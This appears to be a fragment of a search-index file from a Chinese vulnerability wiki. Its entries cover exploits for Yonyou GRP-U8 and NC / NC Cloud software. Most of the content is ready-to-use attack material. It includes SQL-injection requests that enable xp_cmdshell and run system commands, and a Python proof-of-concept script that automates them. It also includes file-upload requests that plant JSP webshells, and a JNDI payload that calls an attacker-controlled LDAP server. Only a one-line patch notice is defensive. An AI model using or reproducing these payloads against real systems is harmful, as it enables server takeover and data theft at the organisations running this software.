Proxy SQL注入 CNNVD-201610-923 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-grp-u8-proxy-sql%E6%B3%A8%E5%85%A5-cnnvd-201610-923/:0:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-grp-u8-proxy-sql%E6%B3%A8%E5%85%A5-cnnvd-201610-923/"},{"categories":null,"content":"漏洞描述 用友GRP-u8存在XXE漏洞，该漏洞源于应用程序解析XML输入时没有进制外部实体的加载，导致可加载外部SQL语句，以及命令执行 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-grp-u8-proxy-sql%E6%B3%A8%E5%85%A5-cnnvd-201610-923/:1:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-grp-u8-proxy-sql%E6%B3%A8%E5%85%A5-cnnvd-201610-923/"},{"categories":null,"content":"漏洞影响 用友GRP-U8行政事业内控管理软件（新政府会计制度专版） ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-grp-u8-proxy-sql%E6%B3%A8%E5%85%A5-cnnvd-201610-923/:2:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-grp-u8-proxy-sql%E6%B3%A8%E5%85%A5-cnnvd-201610-923/"},{"categories":null,"content":"网络测绘 title=\"用友GRP-U8行政事业内控管理软件\" ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-grp-u8-proxy-sql%E6%B3%A8%E5%85%A5-cnnvd-201610-923/:3:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-grp-u8-proxy-sql%E6%B3%A8%E5%85%A5-cnnvd-201610-923/"},{"categories":null,"content":"漏洞复现 漏洞利用POC请求包 POST /Proxy HTTP/1.1 Accept: Accept: */* Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/4.0 (compatible; MSIE 6.0;) Host: host Content-Length: 357 Connection: Keep-Alive Cache-Control: no-cache cVer=9.8.0\u0026dp=\u003c?xml version=\"1.0\" encoding=\"GB2312\"?\u003e\u003cR9PACKET version=\"1\"\u003e\u003cDATAFORMAT\u003eXML\u003c/DATAFORMAT\u003e\u003cR9FUNCTION\u003e \u003cNAME\u003eAS_DataRequest\u003c/NAME\u003e\u003cPARAMS\u003e\u003cPARAM\u003e \u003cNAME\u003eProviderName\u003c/NAME\u003e\u003cDATA format=\"text\"\u003eDataSetProviderData\u003c/DATA\u003e\u003c/PARAM\u003e\u003cPARAM\u003e \u003cNAME\u003eData\u003c/NAME\u003e\u003cDATA format=\"text\"\u003eselect @@version\u003c/DATA\u003e\u003c/PARAM\u003e\u003c/PARAMS\u003e \u003c/R9FUNCTION\u003e\u003c/R9PACKET\u003e 请求后按F12查看源代码可以得到SQL语句查询结果 也可以调用 xp_cmdshell 来执行系统命令(大部分此系统为windows) 注意：大部分默认是不开启 xp_cmdshell 模块的 可以使用如下方法打开xp_cmdshell方法 将如下POST数据按顺序发送(注意 master 改为当前数据库名) cVer=9.8.0\u0026dp=\u003c?xml version=\"1.0\" encoding=\"GB2312\"?\u003e\u003cR9PACKET version=\"1\"\u003e\u003cDATAFORMAT\u003eXML\u003c/DATAFORMAT\u003e\u003cR9FUNCTION\u003e\u003cNAME\u003eAS_DataRequest\u003c/NAME\u003e\u003cPARAMS\u003e\u003cPARAM\u003e\u003cNAME\u003eProviderName\u003c/NAME\u003e\u003cDATA format=\"text\"\u003eDataSetProviderData\u003c/DATA\u003e\u003c/PARAM\u003e\u003cPARAM\u003e\u003cNAME\u003eData\u003c/NAME\u003e\u003cDATA format=\"text\"\u003euse master\u003c/DATA\u003e\u003c/PARAM\u003e\u003c/PARAMS\u003e\u003c/R9FUNCTION\u003e\u003c/R9PACKET\u003e cVer=9.8.0\u0026dp=\u003c?xml version=\"1.0\" encoding=\"GB2312\"?\u003e\u003cR9PACKET version=\"1\"\u003e\u003cDATAFORMAT\u003eXML\u003c/DATAFORMAT\u003e\u003cR9FUNCTION\u003e\u003cNAME\u003eAS_DataRequest\u003c/NAME\u003e\u003cPARAMS\u003e\u003cPARAM\u003e\u003cNAME\u003eProviderName\u003c/NAME\u003e\u003cDATA format=\"text\"\u003eDataSetProviderData\u003c/DATA\u003e\u003c/PARAM\u003e\u003cPARAM\u003e\u003cNAME\u003eData\u003c/NAME\u003e\u003cDATA format=\"text\"\u003eexec sp_configure 'show advanced options',1\u003c/DATA\u003e\u003c/PARAM\u003e\u003c/PARAMS\u003e\u003c/R9FUNCTION\u003e\u003c/R9PACKET\u003e cVer=9.8.0\u0026dp=\u003c?xml version=\"1.0\" encoding=\"GB2312\"?\u003e\u003cR9PACKET version=\"1\"\u003e\u003cDATAFORMAT\u003eXML\u003c/DATAFORMAT\u003e\u003cR9FUNCTION\u003e\u003cNAME\u003eAS_DataRequest\u003c/NAME\u003e\u003cPARAMS\u003e\u003cPARAM\u003e\u003cNAME\u003eProviderName\u003c/NAME\u003e\u003cDATA format=\"text\"\u003eDataSetProviderData\u003c/DATA\u003e\u003c/PARAM\u003e\u003cPARAM\u003e\u003cNAME\u003eData\u003c/NAME\u003e\u003cDATA format=\"text\"\u003ereconfigure\u003c/DATA\u003e\u003c/PARAM\u003e\u003c/PARAMS\u003e\u003c/R9FUNCTION\u003e\u003c/R9PACKET\u003e cVer=9.8.0\u0026dp=\u003c?xml version=\"1.0\" encoding=\"GB2312\"?\u003e\u003cR9PACKET version=\"1\"\u003e\u003cDATAFORMAT\u003eXML\u003c/DATAFORMAT\u003e\u003cR9FUNCTION\u003e\u003cNAME\u003eAS_DataRequest\u003c/NAME\u003e\u003cPARAMS\u003e\u003cPARAM\u003e\u003cNAME\u003eProviderName\u003c/NAME\u003e\u003cDATA format=\"text\"\u003eDataSetProviderData\u003c/DATA\u003e\u003c/PARAM\u003e\u003cPARAM\u003e\u003cNAME\u003eData\u003c/NAME\u003e\u003cDATA format=\"text\"\u003eexec sp_configure 'xp_cmdshell',1\u003c/DATA\u003e\u003c/PARAM\u003e\u003c/PARAMS\u003e\u003c/R9FUNCTION\u003e\u003c/R9PACKET\u003e cVer=9.8.0\u0026dp=\u003c?xml version=\"1.0\" encoding=\"GB2312\"?\u003e\u003cR9PACKET version=\"1\"\u003e\u003cDATAFORMAT\u003eXML\u003c/DATAFORMAT\u003e\u003cR9FUNCTION\u003e\u003cNAME\u003eAS_DataRequest\u003c/NAME\u003e\u003cPARAMS\u003e\u003cPARAM\u003e\u003cNAME\u003eProviderName\u003c/NAME\u003e\u003cDATA format=\"text\"\u003eDataSetProviderData\u003c/DATA\u003e\u003c/PARAM\u003e\u003cPARAM\u003e\u003cNAME\u003eData\u003c/NAME\u003e\u003cDATA format=\"text\"\u003ereconfigure\u003c/DATA\u003e\u003c/PARAM\u003e\u003c/PARAMS\u003e\u003c/R9FUNCTION\u003e\u003c/R9PACKET\u003e 发送如上实际为执行SQL语句打开 xp_cmdshell use master; exec sp_configure ‘show advanced options’,1; reconfigure; exec sp_configure ‘xp_cmdshell’,1; reconfigure; 再发送以下数据可成功使用(也可能失败) cVer=9.8.0\u0026dp=\u003c?xml version=\"1.0\" encoding=\"GB2312\"?\u003e\u003cR9PACKET version=\"1\"\u003e\u003cDATAFORMAT\u003eXML\u003c/DATAFORMAT\u003e\u003cR9FUNCTION\u003e\u003cNAME\u003eAS_DataRequest\u003c/NAME\u003e\u003cPARAMS\u003e\u003cPARAM\u003e\u003cNAME\u003eProviderName\u003c/NAME\u003e\u003cDATA format=\"text\"\u003eDataSetProviderData\u003c/DATA\u003e\u003c/PARAM\u003e\u003cPARAM\u003e\u003cNAME\u003eData\u003c/NAME\u003e\u003cDATA format=\"text\"\u003eexec xp_cmdshell \"whoami\"\u003c/DATA\u003e\u003c/PARAM\u003e\u003c/PARAMS\u003e\u003c/R9FUNCTION\u003e\u003c/R9PACKET\u003e 执行过程中报错 java.sql.SQLException【错误代码: 0; 相关信息:xxxxxx】不用理会 发送请求后再使用此模块则会成功请求执行系统命令 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-grp-u8-proxy-sql%E6%B3%A8%E5%85%A5-cnnvd-201610-923/:4:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-grp-u8-proxy-sql%E6%B3%A8%E5%85%A5-cnnvd-201610-923/"},{"categories":null,"content":"漏洞POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import re import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 用友GRP-U8行政事业内控管理软件 \\033[0m') print('+ \\033[36m使用格式: python3 CNNVD-201610-923.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36m(Y/N) \u003e\u003e\u003e Y or N \\033[0m') print('+ \\033[36mcmd \u003e\u003e\u003e ipconfig \\033[0m') print('+------------------------------------------') def POC_1(target_url): check_url = target_url + \"/Proxy\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = \"\"\"cVer=9.8.0\u0026dp=\u003c?xml version=\"1.0\" encoding=\"GB2312\"?\u003e\u003cR9PACKET version=\"1\"\u003e\u003cDATAFORMAT\u003eXML\u003c/DATAFORMAT\u003e\u003cR9FUNCTION\u003e\u003cNAME\u003eAS_DataRequest\u003c/NAME\u003e\u003cPARAMS\u003e\u003cPARAM\u003e\u003cNAME\u003eProviderName\u003c/NAME\u003e\u003cDATA format=\"text\"\u003eDataSetProviderData\u003c/DATA\u003e\u003c/PARAM\u003e\u003cPARAM\u003e\u003cNAME\u003eData\u003c/NAME\u003e\u003cDATA format=\"text\"\u003eselect 1,user,db_name(),host_name(),@@version\u003c/DATA\u003e\u003c/PARAM\u003e\u003c/PARAMS\u003e\u003c/R9FUNCTION\u003e\u003c/R9PACKET\u003e\"\"\" try: print(\"\\033[32m[o] 正在执行SQL语句:select 1,user,db_name(),host_name(),@@version...\\033[0m\") response = requests.post(url=check_url, headers=headers, data=data, timeout=10) row_1 = '\u003cROW COLUMN1=\"1\"' row_2 = r'COLUMN2=\"(.*?)\"' row_3 = r'COLUMN3=\"(.*?)\"' row_4 = r'COLUMN4=\"(.*?)\"' row_5 = r'COLUMN5=\"(.*?)\"' if row_1 in response.text and \"服务器错误信息：null\" not in response.text: db_user = re.findall(row_2, response.text)[0] db_name = re.findall(row_3, response.text)[0] db_host = re.findall(row_4, response.text)[0] db_vers = re.findall(row_5, response.text)[0] print(\"\\033[32m[o] 存在漏洞，漏洞响应为:\\033[0m\") print(\"\\033[32m \u003e\u003e 数据库用户为:{}\\033[0m\".format(db_user)) print(\"\\033[32m \u003e\u003e 数据库名为:{}\\033[0m\".format(db_name)) print(\"\\033[32m \u003e\u003e 数据库主机名为:{}\\033[0m\".format(db_host)) print(\"\\033[32m \u003e\u003e 数据库版本为:{}\\033[0m\".format(db_vers)) return db_name else: print(\"\\033[31m[x] 漏洞已被修复 \\033[0m\") sys.exit(0) except: print(\"\\033[31m[x] 请求失败 \\033[0m\") sys.exit(0) def xp_cmdshell_open(target_url, db_name): open_sql = [\"use {}\".format(db_name),\"exec sp_configure 'show advanced options',1\",\"reconfigure\",\"exec sp_configure 'xp_cmdshell',1\",\"reconfigure\"] num = 1 for sql in open_sql: open_url = target_url + \"/Proxy\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = 'cVer=9.8.0\u0026dp=\u003c?xml version=\"1.0\" encoding=\"GB2312\"?\u003e\u003cR9PACKET version=\"1\"\u003e\u003cDATAFORMAT\u003eXML\u003c/DATAFORMAT\u003e\u003cR9FUNCTION\u003e\u003cNAME\u003eAS_DataRequest\u003c/NAME\u003e\u003cPARAMS\u003e\u003cPARAM\u003e\u003cNAME\u003eProviderName\u003c/NAME\u003e\u003cDATA format=\"text\"\u003eDataSetProviderData\u003c/DATA\u003e\u003c/PARAM\u003e\u003cPARAM\u003e\u003cNAME\u003eData\u003c/NAME\u003e\u003cDATA format=\"text\"\u003e{}\u003c/DATA\u003e\u003c/PARAM\u003e\u003c/PARAMS\u003e\u003c/R9FUNCTION\u003e\u003c/R9PACKET\u003e'.format(sql) try: print(\"\\033[32m[o] 正在执行SQL语句:{}...\\033[0m\".format(sql)) response = requests.post(url=open_url, headers=headers, data=data, timeout=10) num = num + 1 if num == 5 : POC_2(target_url, db_name) except: print(\"\\033[31m[x] 开启 xp_cmdsheall 失败 \\033[0m\") sys.exit(0) def POC_2(target_url, db_name): db_name = db_name sql_cmd_url = target_url + \"/Proxy\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = \"\"\"cVer=9.8.0\u0026dp=\u003c?xml version=\"1.0\" encoding=\"GB2312\"?\u003e\u003cR9PACKET version=\"1\"\u003e\u003cDATAFORMAT\u003eXML\u003c/DATAFORMAT\u003e\u003cR9FUNCTION\u003e\u003cNAME\u003eAS_DataRequest\u003c/NAME\u003e\u003cPARAMS\u003e\u003cPARAM\u003e\u003cNAME\u003eProviderName\u003c/NAME\u003e\u003cDATA format=\"text\"\u003eDataSetProviderData\u003c/DATA\u003e\u003c/PARAM\u003e\u003cPARAM\u003e\u003cNAME\u003eData\u003c/NAME\u003e\u003cDATA format=\"text\"\u003eexec xp_cmdshell \"whoami\"\u003c/DATA\u003e\u003c/PARAM\u003e\u003c/PARAMS\u003e\u003c/R9FUNCTION\u003e\u003c/R9PACKET\u003e\"\"\" try: print(\"\\033[32m[o] 正","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-grp-u8-proxy-sql%E6%B3%A8%E5%85%A5-cnnvd-201610-923/:5:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-grp-u8-proxy-sql%E6%B3%A8%E5%85%A5-cnnvd-201610-923/"},{"categories":null,"content":"用友 GRP-U8 UploadFileData 任意文件上传漏洞 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-grp-u8-uploadfiledata-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-grp-u8-uploadfiledata-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 用友 GRP-U8 UploadFileData接口存在任意文件上传漏洞，攻击者通过漏洞可以获取服务器权限 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-grp-u8-uploadfiledata-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-grp-u8-uploadfiledata-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 用友 GRP-U8 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-grp-u8-uploadfiledata-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-grp-u8-uploadfiledata-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"用友-GRP-U8\" ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-grp-u8-uploadfiledata-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-grp-u8-uploadfiledata-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC POST /UploadFileData?action=upload_file\u00261=1\u00261=1\u00261=1\u00261=1\u00261=1\u00261=1\u00261=1\u00261=1\u00261=1\u00261=1\u00261=1\u00261=1\u00261=1\u00261=1\u00261=1\u00261=1\u00261=1\u00261=1\u00261=1\u00261=1\u00261=1\u00261=1\u00261=1\u00261=1\u00261=1\u00261=1\u00261=1\u00261=1\u0026foldername=%2e%2e%2f\u0026filename=debugg.jsp\u0026filename=1.jpg HTTP/1.1 Host: Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: JSESSIONID=59227D2C93FE3E8C2626DA625CE710F9 Content-Type: multipart/form-data Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36 ------WebKitFormBoundary92pUawKc Content-Disposition: form-data; name=\"myFile\";filename=\"test.jpg\" \u003c% out.println(\"123\");%\u003e ------WebKitFormBoundary92pUawKc-- 访问写入的文件 /R9iPortal/debugg.jsp ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-grp-u8-uploadfiledata-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-grp-u8-uploadfiledata-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"用友 NC bsh.servlet.BshServlet 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-nc-bsh.servlet.bshservlet-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-nc-bsh.servlet.bshservlet-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 用友 NC bsh.servlet.BshServlet 存在远程命令执行漏洞，通过BeanShell 执行远程命令获取服务器权限 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-nc-bsh.servlet.bshservlet-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-nc-bsh.servlet.bshservlet-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 用友 NC ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-nc-bsh.servlet.bshservlet-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-nc-bsh.servlet.bshservlet-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 icon_hash=\"1085941792\" ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-nc-bsh.servlet.bshservlet-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-nc-bsh.servlet.bshservlet-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 访问页面如下 漏洞Url为 /servlet/~ic/bsh.servlet.BshServlet ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-nc-bsh.servlet.bshservlet-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-nc-bsh.servlet.bshservlet-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"用友 NC Cloud jsinvoke 任意文件上传漏洞 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-nc-cloud-jsinvoke-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-nc-cloud-jsinvoke-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 用友 NC Cloud jsinvoke 接口存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件至服务器中，获取系统权限 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-nc-cloud-jsinvoke-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-nc-cloud-jsinvoke-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 用友 NC Cloud ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-nc-cloud-jsinvoke-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-nc-cloud-jsinvoke-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"用友-NC-Cloud\" ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-nc-cloud-jsinvoke-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-nc-cloud-jsinvoke-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 验证POC POST /uapjs/jsinvoke/?action=invoke Content-Type: application/json { \"serviceName\":\"nc.itf.iufo.IBaseSPService\", \"methodName\":\"saveXStreamConfig\", \"parameterTypes\":[ \"java.lang.Object\", \"java.lang.String\" ], \"parameters\":[ \"${param.getClass().forName(param.error).newInstance().eval(param.cmd)}\", \"webapps/nc_web/407.jsp\" ] } POST /uapjs/jsinvoke/?action=invoke HTTP/1.1 Host: Connection: Keep-Alive Content-Length: 253 Content-Type: application/x-www-form-urlencoded {\"serviceName\":\"nc.itf.iufo.IBaseSPService\",\"methodName\":\"saveXStreamConfig\",\"parameterTypes\":[\"java.lang.Object\",\"java.lang.String\"],\"parameters\":[\"${''.getClass().forName('javax.naming.InitialContext').newInstance().lookup('ldap://VPSip:1389/TomcatBypass/TomcatEcho')}\",\"webapps/nc_web/301.jsp\"]} /cmdtest.jsp?error=bsh.Interpreter\u0026cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(%22whoami%22).getInputStream()) ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-nc-cloud-jsinvoke-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-nc-cloud-jsinvoke-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"用友 NC Cloud 远程代码执行漏洞 CNVD-C-2023-76801 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-nc-cloud-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-c-2023-76801/:0:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-nc-cloud-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-c-2023-76801/"},{"categories":null,"content":"漏洞描述 用友 NC 及 NC Cloud 系统存在任意文件上传漏洞，攻击者可通过 uapjs（jsinvoke）应用构造恶意请求非法上传后门程序，此漏洞可以给 NC 服务器预埋后门，从而可以随意操作服务器。 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-nc-cloud-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-c-2023-76801/:1:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-nc-cloud-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-c-2023-76801/"},{"categories":null,"content":"漏洞影响 NC63、NC633、NC65 NC Cloud1903、NC Cloud1909 NC Cloud2005、NC Cloud2105、NC Cloud2111 YonBIP 高级版 2207 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-nc-cloud-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-c-2023-76801/:2:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-nc-cloud-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-c-2023-76801/"},{"categories":null,"content":"漏洞复现 JNDI：https://github.com/WhiteHSBG/JNDIExploit exp： POST /uapjs/jsinvoke/?action=invoke HTTP/1.1 Host: your-ip Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0 {\"serviceName\":\"nc.itf.iufo.IBaseSPService\",\"methodName\":\"saveXStreamConfig\",\"parameterTypes\":[\"java.lang.Object\",\"java.lang.String\"],\"parameters\":[\"${''.getClass().forName('javax.naming.InitialContext').newInstance().lookup('ldap://VPSip:1389/TomcatBypass/TomcatEcho')}\",\"webapps/nc_web/jndi.jsp\"]} exp 中使用的是 JNDI 工具的 TomcatEcho 回显链 ，执行命令并回显： GET /jndi.jsp HTTP/1.1 Host: your-ip Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0 cmd: whoami ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-nc-cloud-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-c-2023-76801/:3:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-nc-cloud-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-c-2023-76801/"},{"categories":null,"content":"漏洞修复 官方已经发布修复补丁，请进行升级。 或者进行 waf 等安全部署拦截恶意字符 